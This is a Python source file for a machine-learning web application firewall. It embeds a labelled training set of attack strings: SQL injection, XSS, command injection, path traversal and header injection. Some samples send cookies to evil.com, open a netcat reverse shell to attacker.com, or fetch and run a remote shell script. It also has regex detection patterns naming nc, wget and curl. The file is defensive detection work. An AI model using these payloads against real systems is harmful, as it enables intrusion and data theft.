"""
ai_waf_engine.py
author: Prashant Sharma

AI-powered Web Application Firewall using Machine Learning.
Uses TF-IDF vectorization + Logistic Regression to classify payloads
as ATTACK or CLEAN, trained in-memory on startup.

This is intentionally a lightweight model — accuracy over speed.
For production use, replace the in-memory dataset with a proper
corpus like CSIC 2010 or PayloadAllTheThings labelled set.
"""

import logging
import re
from dataclasses import dataclass
from typing import List, Tuple

logger = logging.getLogger("encoder.ai_waf")

# ── Inline Training Dataset ───────────────────────────────────
# Each entry is (payload_string, label)  label=1 → ATTACK, label=0 → CLEAN

_TRAINING_DATA: List[Tuple[str, int]] = [
    # ── SQL Injection ─────────────────────────────────────────
    ("' OR 1=1 --", 1),
    ("' OR '1'='1", 1),
    ("admin'--", 1),
    ("1; DROP TABLE users--", 1),
    ("UNION SELECT null,null,null--", 1),
    ("' UNION SELECT username,password FROM users--", 1),
    ("1' AND SLEEP(5)--", 1),
    ("1 AND 1=1", 1),
    ("'; INSERT INTO users VALUES('hack','hack')--", 1),
    ("' OR 1=1#", 1),
    ("1 OR 1=1", 1),
    ("' OR 'x'='x", 1),
    ("1; SELECT * FROM information_schema.tables--", 1),
    ("'; EXEC xp_cmdshell('dir')--", 1),
    ("1' WAITFOR DELAY '0:0:5'--", 1),
    ("0x31 OR 0x31=0x31", 1),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", 1),
    ("1 UNION ALL SELECT 1,group_concat(table_name) FROM information_schema.tables--", 1),
    ("' OR CHAR(49)=CHAR(49)--", 1),
    ("/* comment */ OR 1=1", 1),
    ("admin' OR '1'='1'/*", 1),
    ("'; SHUTDOWN--", 1),
    ("1 OR '1'='1", 1),
    # ── XSS ──────────────────────────────────────────────────
    ("<script>alert(1)</script>", 1),
    ("<img src=x onerror=alert(1)>", 1),
    ("javascript:alert(document.cookie)", 1),
    ("<svg onload=alert(1)>", 1),
    ("<body onload=alert('XSS')>", 1),
    ("'\"><script>alert(1)</script>", 1),
    ("<iframe src=javascript:alert(1)>", 1),
    ("eval(String.fromCharCode(97,108,101,114,116,40,49,41))", 1),
    ("<input autofocus onfocus=alert(1)>", 1),
    ("<script>document.location='http://evil.com?c='+document.cookie</script>", 1),
    ("';alert(String.fromCharCode(88,83,83))//", 1),
    ("<div style=\"background:url(javascript:alert(1))\">", 1),
    ("\"><img src=\"x\" onerror=\"alert(1)\">", 1),
    ("<<SCRIPT>alert('XSS');//<</SCRIPT>", 1),
    # ── Command Injection ─────────────────────────────────────
    ("; cat /etc/passwd", 1),
    ("| whoami", 1),
    ("; ls -la", 1),
    ("&& cat /etc/shadow", 1),
    ("`id`", 1),
    ("$(whoami)", 1),
    ("; ping -c 1 attacker.com", 1),
    ("| nc -e /bin/sh attacker.com 4444", 1),
    ("; wget http://evil.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh", 1),
    ("' ; uname -a #", 1),
    # ── Path Traversal ────────────────────────────────────────
    ("../../etc/passwd", 1),
    ("../../../etc/shadow", 1),
    ("%2e%2e%2fetc%2fpasswd", 1),
    ("..\\..\\windows\\system32\\cmd.exe", 1),
    ("/etc/passwd%00", 1),
    ("%c0%ae%c0%ae/etc/passwd", 1),
    # ── Header Injection ──────────────────────────────────────
    ("foo%0d%0aSet-Cookie: admin=true", 1),
    ("value\r\nSet-Cookie: session=hijacked", 1),
    # ── CLEAN (Benign inputs) ─────────────────────────────────
    ("hello world", 0),
    ("search for cats and dogs", 0),
    ("my email is test@example.com", 0),
    ("product id 12345", 0),
    ("what is the weather today?", 0),
    ("username: john_doe", 0),
    ("SELECT is a word I use in sentences", 0),
    ("I like OR dislike things", 0),
    ("my password is strong", 0),
    ("order by price descending", 0),
    ("drop shipment tracking number 4521", 0),
    ("insert a comment here", 0),
    ("null value in the form", 0),
    ("http://example.com/page", 0),
    ("user@domain.com", 0),
    ("query=python tutorial", 0),
    ("first name: Alice last name: Smith", 0),
    ("age 25 height 180cm", 0),
    ("1 + 1 = 2", 0),
    ("file path: C:\\Users\\Documents", 0),
    ("page 1 of 10", 0),
    ("sort by date asc", 0),
    ("category electronics", 0),
    ("price range 100 to 500", 0),
    ("city: New York, state: NY", 0),
    ("The script ran successfully", 0),
    ("alert the team about the meeting", 0),
    ("exec summary for Q3", 0),
    ("cat food for my pet", 0),
    ("ping me when you're free", 0),
    ("union of states in the country", 0),
    ("drop the topic if you want", 0),
    ("my location is 127.0.0.1 in the lab", 0),
]


@dataclass
class AIWAFResult:
    """Result from the AI WAF classifier."""
    payload: str
    label: str          # "ATTACK" or "CLEAN"
    confidence: float   # 0.0 to 1.0
    attack_probability: float
    clean_probability: float
    features_matched: List[str]

    def to_dict(self) -> dict:
        return {
            "payload": self.payload,
            "label": self.label,
            "confidence":round(self.confidence * 100, 1),
            "attack_probability": round(self.attack_probability * 100, 1),
            "clean_probability": round(self.clean_probability * 100, 1),
            "features_matched": self.features_matched,
        }


class AIWAFEngine:
    """
    Machine Learning based WAF engine.

    Trains a TF-IDF + Logistic Regression pipeline on startup.
    Classifies payloads as ATTACK or CLEAN with a confidence score.
    """

    def __init__(self):
        self._model = None
        self._vectorizer = None
        self._trained = False
        self._train_accuracy = 0.0
        self._train()

    def _train(self) -> None:
        """Train the ML model on the built-in labelled dataset."""
        try:
            from sklearn.feature_extraction.text import TfidfVectorizer
            from sklearn.linear_model import LogisticRegression
            from sklearn.pipeline import Pipeline
            from sklearn.model_selection import cross_val_score
            import numpy as np

            texts = [d[0] for d in _TRAINING_DATA]
            labels = [d[1] for d in _TRAINING_DATA]

            self._pipeline = Pipeline([
                ("tfidf", TfidfVectorizer(
                    analyzer="char_wb",     # character n-grams — better for attack patterns
                    ngram_range=(2, 5),     # 2-5 character sequences
                    min_df=1,
                    max_features=3000,
                    sublinear_tf=True,
                )),
                ("clf", LogisticRegression(
                    C=5.0,
                    max_iter=1000,
                    random_state=42,
                    solver="lbfgs",
                )),
            ])

            self._pipeline.fit(texts, labels)

            # Cross-validation accuracy
            scores = cross_val_score(self._pipeline, texts, labels, cv=5)
            self._train_accuracy = float(np.mean(scores))
            self._trained = True
            logger.info("AI WAF trained. CV accuracy: %.1f%%", self._train_accuracy * 100)

        except Exception as exc:
            logger.error("AI WAF training failed: %s", exc)
            self._trained = False

    def classify(self, payload: str) -> AIWAFResult:
        """Classify a payload as ATTACK or CLEAN with confidence."""
        if not self._trained:
            return AIWAFResult(
                payload=payload, label="UNKNOWN", confidence=0.0,
                attack_probability=0.0, clean_probability=0.0,
                features_matched=["Model not trained"],
            )

        try:
            proba = self._pipeline.predict_proba([payload])[0]
            clean_prob, attack_prob = float(proba[0]), float(proba[1])
            is_attack = attack_prob > 0.5
            confidence = attack_prob if is_attack else clean_prob

            features = self._extract_suspicious_features(payload)

            return AIWAFResult(
                payload=payload,
                label="ATTACK" if is_attack else "CLEAN",
                confidence=confidence,
                attack_probability=attack_prob,
                clean_probability=clean_prob,
                features_matched=features,
            )
        except Exception as exc:
            logger.error("AI WAF classify error: %s", exc)
            return AIWAFResult(
                payload=payload, label="ERROR", confidence=0.0,
                attack_probability=0.0, clean_probability=0.0,
                features_matched=[str(exc)],
            )

    def batch_classify(self, payloads: List[str]) -> List[AIWAFResult]:
        """Classify multiple payloads at once."""
        return [self.classify(p) for p in payloads]

    def get_stats(self) -> dict:
        """Return model stats."""
        return {
            "trained": self._trained,
            "train_accuracy_pct": round(self._train_accuracy * 100, 1),
            "training_samples": len(_TRAINING_DATA),
            "attack_samples": sum(1 for _, l in _TRAINING_DATA if l == 1),
            "clean_samples": sum(1 for _, l in _TRAINING_DATA if l == 0),
            "model_type": "TF-IDF (char 2-5gram) + Logistic Regression",
        }

    @staticmethod
    def _extract_suspicious_features(payload: str) -> List[str]:
        """Identify which attack categories the payload resembles."""
        features = []
        checks = [
            (r"(?i)(union.*select|select.*from|drop\s+table|insert\s+into|delete\s+from)", "SQL Keywords"),
            (r"(?i)(or\s+1\s*=\s*1|and\s+1\s*=\s*1|or\s+'[^']*'\s*=\s*'[^']*')", "SQL Logic Bypass"),
            (r"(?i)(<script|javascript:|onerror=|onload=|eval\(|alert\()", "XSS Patterns"),
            (r"(?i)(document\.cookie|document\.location|String\.fromCharCode)", "JS Data Theft"),
            (r"(;|\||\`|\$\()\s*(cat|ls|whoami|id|wget|curl|nc)\b", "Command Injection"),
            (r"(\.\./|\.\.\\|%2e%2e)", "Path Traversal"),
            (r"(%0d%0a|\r\n|set-cookie\s*:)", "Header Injection"),
            (r"(?i)(sleep\s*\(|waitfor\s+delay|benchmark\s*\()", "Blind SQLI/Timing"),
            (r"(%00|\\x00|\\u0000)", "Null Byte"),
        ]
        for pattern, name in checks:
            if re.search(pattern, payload):
                features.append(name)
        return features if features else ["No known patterns detected"]
